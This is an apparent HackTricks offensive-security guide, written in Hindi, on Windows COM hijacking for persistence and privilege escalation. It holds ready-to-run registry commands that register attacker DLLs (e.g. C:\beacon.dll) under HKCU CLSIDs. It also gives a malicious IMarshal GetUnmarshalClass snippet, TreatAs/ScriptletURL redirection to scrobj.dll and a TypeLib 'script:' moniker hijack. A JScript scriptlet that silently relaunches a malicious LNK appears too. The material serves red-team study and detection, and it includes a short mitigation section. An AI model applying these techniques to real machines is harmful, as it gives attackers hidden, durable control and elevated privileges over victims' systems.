# COM Hijacking

{{#include ../../banners/hacktricks-training.md}}

### मौजूद न होने वाले COM components खोजना

चूँकि users HKCU की values को modify कर सकते हैं, इसलिए **COM Hijacking** का उपयोग **persistence mechanism** के रूप में किया जा सकता है। `procmon` का उपयोग करके ऐसे COM registries को आसानी से खोजा जा सकता है जिन्हें खोजा तो जा रहा है, लेकिन जो अभी मौजूद नहीं हैं और जिन्हें attacker बना सकता है। सामान्य filters:

- **RegOpenKey** operations।
- जहाँ _Result_ **NAME NOT FOUND** हो।
- और _Path_ का अंत **InprocServer32** से होता हो।

खोज के दौरान उपयोगी विकल्प:

- गायब **`LocalServer32`** keys भी खोजें। कुछ COM classes out-of-process servers होते हैं और DLL के बजाय attacker-controlled EXE launch करेंगे।
- `InprocServer32` के साथ-साथ **`TreatAs`** और **`ScriptletURL`** registry operations भी खोजें। हाल के detection content और malware writeups में इनका बार-बार उल्लेख होता है, क्योंकि ये सामान्य COM registrations की तुलना में बहुत कम पाए जाते हैं और इसलिए इनसे मिलने वाला signal अधिक विश्वसनीय होता है।
- HKCU में registration की नकल करते समय मूल `HKLM\Software\Classes\CLSID\{CLSID}\InprocServer32` से वैध **`ThreadingModel`** कॉपी करें। गलत model का उपयोग अक्सर activation को बाधित करता है और hijack को आसानी से पकड़ में आने वाला बना देता है।<sup>[[3]](#references)</sup>
- 64-bit systems पर 64-bit और 32-bit, दोनों views जाँचें (`procmon.exe` बनाम `procmon64.exe`, `HKLM\Software\Classes` और `HKLM\Software\Classes\WOW6432Node`), क्योंकि 32-bit applications किसी अलग COM registration को resolve कर सकती हैं।

किस गैर-मौजूद COM का impersonation करना है, यह तय करने के बाद नीचे दिए गए commands चलाएँ। _अगर आप ऐसे COM का impersonation करने का निर्णय लेते हैं जिसे हर कुछ seconds में load किया जाता है, तो सावधान रहें—यह ज़रूरत से ज़्यादा हो सकता है।_

```bash
New-Item -Path "HKCU:Software\Classes\CLSID" -Name "{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}"
New-Item -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}" -Name "InprocServer32" -Value "C:\beacon.dll"
New-ItemProperty -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32" -Name "ThreadingModel" -Value "Both"
```

### Hijackable Task Scheduler COM components

Windows Tasks, COM objects को call करने के लिए Custom Triggers का उपयोग करते हैं। चूँकि ये Task Scheduler के ज़रिए execute होते हैं, इसलिए यह अनुमान लगाना आसान होता है कि वे कब trigger होंगे।

<pre class="language-powershell"><code class="lang-powershell"># Show COM CLSIDs
$Tasks = Get-ScheduledTask

foreach ($Task in $Tasks)
{
  if ($Task.Actions.ClassId -ne $null)
  {
    if ($Task.Triggers.Enabled -eq $true)
    {
      $usersSid = "S-1-5-32-545"
      $usersGroup = Get-LocalGroup | Where-Object { $_.SID -eq $usersSid }

      if ($Task.Principal.GroupId -eq $usersGroup)
      {
        Write-Host "Task Name: " $Task.TaskName
        Write-Host "Task Path: " $Task.TaskPath
        Write-Host "CLSID: " $Task.Actions.ClassId
        Write-Host
      }
    }
  }
}

# Sample Output:
<strong># Task Name:  Example
</strong># Task Path:  \Microsoft\Windows\Example\
# CLSID:  {1936ED8A-BD93-3213-E325-F38D112938E1}
# [more like the previous one...]</code></pre>

Output देखकर आप ऐसा Task चुन सकते हैं, जो उदाहरण के लिए **हर बार किसी user के log in करने पर** execute होता हो।

अब **HKEY\CLASSES\ROOT\CLSID** और HKLM तथा HKCU में CLSID **{1936ED8A-BD93-3213-E325-F38D112938EF}** खोजने पर, आमतौर पर आपको पता चलेगा कि यह value HKCU में मौजूद नहीं है।

```bash
# Exists in HKCR\CLSID\
Get-ChildItem -Path "Registry::HKCR\CLSID\{1936ED8A-BD93-3213-E325-F38D112938EF}"

Name           Property
----           --------
InprocServer32 (default)      : C:\Windows\system32\some.dll
               ThreadingModel : Both

# Exists in HKLM
Get-Item -Path "HKLM:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}" | ft -AutoSize

Name                                   Property
----                                   --------
{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1} (default) : MsCtfMonitor task handler

# Doesn't exist in HKCU
PS C:\> Get-Item -Path "HKCU:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}"
Get-Item : Cannot find path 'HKCU:\Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}' because it does not exist.
```

फिर, आप बस HKCU entry बना सकते हैं और हर बार user के login करने पर आपका backdoor सक्रिय हो जाएगा।

## Dangling COM Registrations and Custom Marshaling

मशीन-व्यापी COM registration, registry में बदलाव किए बिना DLL-planting primitive बन सकती है। ऐसा `InprocServer32` value ढूँढें जिसकी DLL मौजूद न हो और जिसका अंतिम path कम-privilege वाला user बना या संशोधित कर सके। ठीक उसी DLL नाम को वहाँ रखने से, CLSID को activate करने वाला कोई भी process attacker का code load कर लेगा। CrossDevice उदाहरण में, registered path `%PROGRAMDATA%\CrossDevice\CrossDevice.Streaming.Source.dll` था, इसलिए एक standard user अनुपस्थित child directory और DLL बना सकता था।<sup>[[5]](#references)</sup>

### Privileged COM activation paths के रूप में writable plugin maps

Writable plugin-ID-to-CLSID map किसी कम-privilege वाले user को यह चुनने दे सकता है कि privileged service कौन-सा in-process COM server load करे, भले ही उस class की मशीन-व्यापी registration संपादित न की जा सके।<sup>[[8]](#references)[[9]](#references)</sup> रिपोर्ट किए गए Windows 11 `InstallService` मामले में, standard users `StaticPluginMap` को संशोधित कर सकते थे; एक non-built-in plugin ID ऐसा CLSID चुनता था जिसे `LocalSystem` service, `CLSCTX_INPROC_SERVER` और `IID_IInstallServicePlugin` के साथ `CoCreateInstance` को देती थी।<sup>[[8]](#references)[[9]](#references)</sup> Registered DLL किसी अलग COM host के बजाय service process में load होती है।<sup>[[10]](#references)</sup>

ज़रूरी शर्तें हैं: map पर प्रभावी write access, plugin request तक पहुँच, और ऐसा `InprocServer32` DLL path जिसे कम-privilege वाला user नियंत्रित कर सके।<sup>[[8]](#references)[[9]](#references)</sup> रिपोर्ट किए गए मामले में, ऊपर बताई गई CrossDevice registration ने path की यह शर्त पूरी की थी।<sup>[[8]](#references)[[9]](#references)</sup> सफल plugin object को अनुरोधित interface देना होगा, लेकिन `CoCreateInstance` के पूरा होने से पहले ही DLL load हो जाती है; उस interface को देने में विफलता अपने-आप यह साबित नहीं करती कि loading के दौरान code execution नहीं हो सकता।<sup>[[8]](#references)[[11]](#references)</sup> यह service-dispatch तरीका नीचे दिए गए custom-`IMarshal` तरीके से अलग है। अलग file-path primitive के लिए, [DLL Hijacking](dll-hijacking/) देखें।

### Cross-process DLL-load primitive के रूप में `IMarshal`

COM आम तौर पर किसी interface pointer को standard `OBJREF` के रूप में दर्शाता है, जो receiver को मूल object की ओर निर्देशित करता है। `IMarshal` लागू करने वाला object इसके बजाय custom `OBJREF` बना सकता है। उसका `GetUnmarshalClass` method उस code का CLSID देता है जो receiving process में object को फिर से बनाएगा। ज़रूरी नहीं कि यह CLSID मूल object की पहचान करे। COM इसे in-process server के रूप में resolve करता है और अनुरोधित interface method को dispatch करने से पहले registered DLL load करता है।<sup>[[5]](#references)[[6]](#references)[[7]](#references)</sup>

एक न्यूनतम malicious implementation में केवल `GetUnmarshalClass` के भीतर dangling CLSID को बदलना होता है।<sup>[[5]](#references)</sup>

```c
HRESULT STDMETHODCALLTYPE GetUnmarshalClass(
    REFIID riid, void *pv, DWORD dest_context,
    void *dest_context_ptr, DWORD flags, CLSID *clsid) override
{
    return CLSIDFromString(L"{DANGLING-CLSID}", clsid);
}
```

इस object को किसी proxied method parameter, जैसे `[in] IUnknown *`, के ज़रिए भेजें। एक अन्य विकल्प `CoGetInstanceFromIStorage` है; इसमें custom-marshaled object को local checks पास करने के लिए `IStorage` का पर्याप्त हिस्सा भी implement करना होगा। Remote server में automatic unmarshaling substituted CLSID को resolve करता है, इसलिए target method चलने से पहले DLL load हो जाती है।<sup>[[5]](#references)</sup>

यह primitive केवल missing registrations तक सीमित नहीं है। इससे receiver को किसी मौजूदा custom-unmarshaler DLL को load करने के लिए भी मजबूर किया जा सकता है और उसके load या unmarshaling path में मौजूद bugs उजागर हो सकते हैं।<sup>[[5]](#references)</sup>

इस chain के लिए ये सभी शर्तें ज़रूरी हैं:<sup>[[5]](#references)</sup>

1. Machine-visible CLSID किसी missing या replaceable in-process DLL की ओर संकेत करता हो।
2. Attacker उस DLL को resolved path पर रख सकता हो।
3. Activatable out-of-process COM server वांछित privilege level पर चलता हो।
4. Server custom marshaling स्वीकार करता हो और ऐसी proxied call उपलब्ध कराता हो जो attacker object को process boundary के पार ले जाए।

### Dangling in-process servers ढूँढें

[OleViewDotNet](https://github.com/tyranid/oleviewdotnet) और [NtObjectManager](https://github.com/googleprojectzero/sandbox-attacksurface-analysis-tools) machine COM database को enumerate कर सकते हैं और सामान्य Win32 module resolution के ज़रिए हर server को test कर सकते हैं। यह `Test-Path` से बेहतर है, क्योंकि कुछ registrations में केवल filename होता है और वे loader search path पर निर्भर करते हैं।<sup>[[5]](#references)</sup>

```powershell
function Test-ComServer($Server) {
    try {
        Use-NtObject ($lib = Import-Win32Module -Path $Server -Flags AsDataFile) { $true }
    } catch { $false }
}

$db = Get-ComDatabase -LoadMode MachineOnly
$classes = Get-ComClass -Database $db -ServerType InProcServer32
$classes | Where-Object { -not (Test-ComServer $_.DefaultServer) } |
    Sort-Object DefaultServer | Select-Object Name, DefaultServer
```

इसे exploitability का प्रमाण नहीं, बल्कि candidate list मानें। Path को loader के तरीके से resolve करें, फिर पहले मौजूद parent और intended DLL—अगर वह पहले से मौजूद है—पर DACL की जाँच करें। कोई file तभी उपयोगी है जब attacker वह path बना या बदल सके जिसे COM वास्तव में resolve करेगा।<sup>[[5]](#references)</sup>

### Privileged receiver चुनें और शुरू करें

Candidate COM classes में `RunAs`, service association, उपलब्ध interfaces और RPC proxies की जाँच करें। `SYSTEM` के लिए configured class, जो किसी named service से जुड़ी न हो, direct activation में विफल हो सकती है क्योंकि RPCSS उसे शुरू नहीं कर सकता। ऐसी स्थिति में, ऐसा unprivileged trigger ढूँढ़ें जो उसका host शुरू करे—जैसे executable scheduled task—और server को चालू रखने के लिए आवश्यक named-event या IPC prerequisite को दोहराएँ।<sup>[[5]](#references)</sup>

उदाहरण के लिए, vulnerable Shell Create Object Handler chain ने user-executable scheduled task invoke करने से पहले अपेक्षित global event बनाकर अपना host शुरू किया।<sup>[[5]](#references)</sup>

```powershell
$ev = New-NtEvent -Win32Path 'Global\ShellCreateObjectTaskReadyEvent' -InitialState $false
Start-ScheduledTask -TaskPath '\Microsoft\Windows\Shell\' -TaskName 'CreateObjectTask'
$ev.Wait()
$object = New-ComObject -Clsid '135fd325-45b7-4c30-89f8-4386961669f0'
```

परिणामी object reference को उसके host से वापस जोड़ें और identity तथा marshaling policy, दोनों की पुष्टि करें। फिर interfaces की सूची बनाएं और उनके proxies को IDL में बदलकर `IUnknown *` जैसा input parameter खोजें, जो fake object को marshal करेगा।<sup>[[5]](#references)</sup>

```powershell
$objref = Get-ComObjRef -Object $object
Get-ComProcess -ProcessId $objref.ProcessId |
    Select-Object Name, User, CustomMarshalAllowed

Get-ComInterface -Object $object
Get-ComInterface -Name '<interface>' | ConvertTo-ComSourceCode -Parse
```

### Custom-marshaling से सुरक्षा

उपयुक्त receiver को untrusted custom marshalers अस्वीकार करने चाहिए। पूरे process पर लागू होने वाली दो सुरक्षा व्यवस्थाएँ हैं: `CoInitializeSecurity` को दिए गए capabilities में `EOAC_NO_CUSTOM_MARSHAL` शामिल करना और `IGlobalOptions::Set` के ज़रिए `COMGLB_UNMARSHALING_POLICY_STRONG` सेट करना। Symbols उपलब्ध होने पर, संबंधित state को `combase!gCapabilities` और `combase!g_GLBOPT_UnmarshalingPolicy` में देखा जा सकता है; जहाँ उसका process parser Windows build को support करता है, वहाँ NtObjectManager परिणाम को `CustomMarshalAllowed` के रूप में दिखाता है।<sup>[[5]](#references)</sup>

---

## COM TreatAs Hijacking + ScriptletURL

`TreatAs` एक CLSID को दूसरे CLSID से emulate करने देता है।<sup>[[4]](#references)</sup> Offensive नज़रिए से, इसका मतलब है कि आप मूल CLSID को जस का तस छोड़ सकते हैं, एक दूसरा per-user CLSID बना सकते हैं जो `scrobj.dll` की ओर इशारा करे, और फिर `HKCU\Software\Classes\CLSID\{Victim}\TreatAs` के ज़रिए असली COM object को malicious CLSID की ओर redirect कर सकते हैं।

यह तब उपयोगी है जब:

- target application, logon के समय या app शुरू होने पर पहले से ही एक स्थिर CLSID instantiate करता हो
- आप मूल `InprocServer32` को replace करने के बजाय केवल registry के ज़रिए redirect करना चाहते हों
- आप `ScriptletURL` value के ज़रिए कोई local या remote `.sct` scriptlet execute करना चाहते हों

उदाहरण workflow (public Atomic Red Team tradecraft और पुराने COM registry abuse research से अनुकूलित):

```cmd
:: 1. Create a malicious per-user COM class backed by scrobj.dll
reg add "HKCU\Software\Classes\AtomicTest" /ve /t REG_SZ /d "AtomicTest" /f
reg add "HKCU\Software\Classes\AtomicTest\CLSID" /ve /t REG_SZ /d "{00000001-0000-0000-0000-0000FEEDACDC}" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}" /ve /t REG_SZ /d "AtomicTest" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\InprocServer32" /ve /t REG_SZ /d "C:\Windows\System32\scrobj.dll" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\InprocServer32" /v "ThreadingModel" /t REG_SZ /d "Apartment" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\ScriptletURL" /ve /t REG_SZ /d "file:///C:/ProgramData/atomic.sct" /f

:: 2. Redirect a high-frequency CLSID to the malicious class
reg add "HKCU\Software\Classes\CLSID\{97D47D56-3777-49FB-8E8F-90D7E30E1A1E}\TreatAs" /ve /t REG_SZ /d "{00000001-0000-0000-0000-0000FEEDACDC}" /f
```

Notes:

- `scrobj.dll` `ScriptletURL` value को पढ़ता है और संदर्भित `.sct` को execute करता है, इसलिए payload को local file के रूप में रखा जा सकता है या HTTP/HTTPS के ज़रिए remote से लाया जा सकता है।
- `TreatAs` तब खास तौर पर उपयोगी है जब मूल COM registration HKLM में पूरी और स्थिर हो, क्योंकि आपको पूरी tree की नकल करने के बजाय केवल एक छोटा per-user redirect बनाना होता है।
- स्वाभाविक trigger का इंतज़ार किए बिना validation के लिए, यदि target class STA activation का समर्थन करती है, तो आप `rundll32.exe -sta <ProgID-or-CLSID>` के ज़रिए fake ProgID/CLSID को manually instantiate कर सकते हैं।

## COM TypeLib Hijacking (script: moniker persistence)

Type Libraries (TypeLib) COM interfaces को परिभाषित करती हैं और `LoadTypeLib()` के ज़रिए load होती हैं। COM server instantiate होने पर, OS `HKCR\TypeLib\{LIBID}` के अंतर्गत registry keys देखकर संबंधित TypeLib को भी load कर सकता है। यदि TypeLib path को किसी **moniker**, जैसे `script:C:\...\evil.sct`, से बदल दिया जाए, तो TypeLib resolve होने पर Windows scriptlet execute करेगा—जिससे ऐसी stealthy persistence मिलती है जो आम components के उपयोग पर trigger होती है।

यह Microsoft Web Browser control के विरुद्ध देखा गया है (जिसे अक्सर Internet Explorer, WebBrowser embed करने वाले apps और यहाँ तक कि `explorer.exe` भी load करते हैं)।<sup>[[1]](#references)[[2]](#references)</sup>

### चरण (PowerShell)

1) किसी high-frequency CLSID द्वारा उपयोग किए जाने वाले TypeLib (LIBID) की पहचान करें। Malware chains द्वारा अक्सर दुरुपयोग किया जाने वाला CLSID, उदाहरण के लिए: `{EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}` (Microsoft Web Browser)।

```powershell
$clsid = '{EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}'
$libid = (Get-ItemProperty -Path "Registry::HKCR\\CLSID\\$clsid\\TypeLib").'(default)'
$ver   = (Get-ChildItem "Registry::HKCR\\TypeLib\\$libid" | Select-Object -First 1).PSChildName
"CLSID=$clsid  LIBID=$libid  VER=$ver"
```

2) `script:` moniker का उपयोग करके per-user TypeLib path को किसी local scriptlet पर पॉइंट करें (admin rights की आवश्यकता नहीं):

```powershell
$dest = 'C:\\ProgramData\\Udate_Srv.sct'
New-Item -Path "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver\\0\\win32" -Force | Out-Null
Set-ItemProperty -Path "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver\\0\\win32" -Name '(default)' -Value "script:$dest"
```

3) एक न्यूनतम JScript `.sct` रखें जो आपके primary payload को फिर से लॉन्च करे (जैसे, initial chain में इस्तेमाल किया गया `.lnk`):

```xml
<?xml version="1.0"?>
<scriptlet>
  <registration progid="UpdateSrv" classid="{F0001111-0000-0000-0000-0000F00D0001}" description="UpdateSrv"/>
  <script language="JScript">
    <![CDATA[
      try {
        var sh = new ActiveXObject('WScript.Shell');
        // Re-launch the malicious LNK for persistence
        var cmd = 'cmd.exe /K set X=1&"C:\\ProgramData\\NDA\\NDA.lnk"';
        sh.Run(cmd, 0, false);
      } catch(e) {}
    ]]>
  </script>
</scriptlet>
```

4) ट्रिगर होना – IE खोलने, WebBrowser control एम्बेड करने वाले application को खोलने, या यहाँ तक कि Explorer की सामान्य गतिविधि से TypeLib लोड होगी और scriptlet execute होगा, जिससे logon/reboot पर आपकी chain फिर से arm हो जाएगी।

सफ़ाई
```powershell
# Remove the per-user TypeLib hijack
Remove-Item -Recurse -Force "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver" 2>$null
# Delete the dropped scriptlet
Remove-Item -Force 'C:\\ProgramData\\Udate_Srv.sct' 2>$null
```

Notes
- आप यही logic अन्य high-frequency COM components पर भी लागू कर सकते हैं; हमेशा पहले `HKCR\CLSID\{CLSID}\TypeLib` से वास्तविक `LIBID` resolve करें।
- 64-bit systems पर आप 64-bit consumers के लिए `win64` subkey भी populate कर सकते हैं।

## References

- [1] [TypeLib को Hijack करना – नई COM persistence technique (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [2] [Check Point Research – ZipLine अभियान: US कंपनियों को निशाना बनाने वाला एक परिष्कृत Phishing Attack](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [3] [COM Hijacking पर फिर से विचार (SpecterOps)](https://specterops.io/blog/2025/05/28/revisiting-com-hijacking/)
- [4] [CLSID Key (Microsoft Learn)](https://learn.microsoft.com/en-us/windows/win32/com/clsid-key-hklm)
- [5] [Project Zero - Windows Exploitation Techniques: Dangling COM Object Registrations](https://projectzero.google/2026/09/windows-dangling-com.html)
- [6] [Microsoft Learn - IMarshal interface](https://learn.microsoft.com/en-us/windows/win32/api/objidl/nn-objidl-imarshal)
- [7] [Microsoft Open Specifications - MS-DCOM OBJREF](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-dcom/fe6c5e46-adf8-4e34-a8de-3f756c875f31)
- [8] [Dark Elevator PoC और तकनीकी विवरण (califio)](https://github.com/califio/publications/tree/main/MADBugs/windows-CVE-2026-50343)
- [9] [Dark Elevator: Windows Install Service Local Privilege Escalation (calif.io)](https://blog.calif.io/p/dark-elevator-windows-install-service)
- [10] [CLSCTX enumeration (Microsoft Learn)](https://learn.microsoft.com/en-us/windows/win32/api/wtypesbase/ne-wtypesbase-clsctx)
- [11] [CoCreateInstance function (Microsoft Learn)](https://learn.microsoft.com/en-us/windows/win32/api/combaseapi/nf-combaseapi-cocreateinstance)
{{#include ../../banners/hacktricks-training.md}}

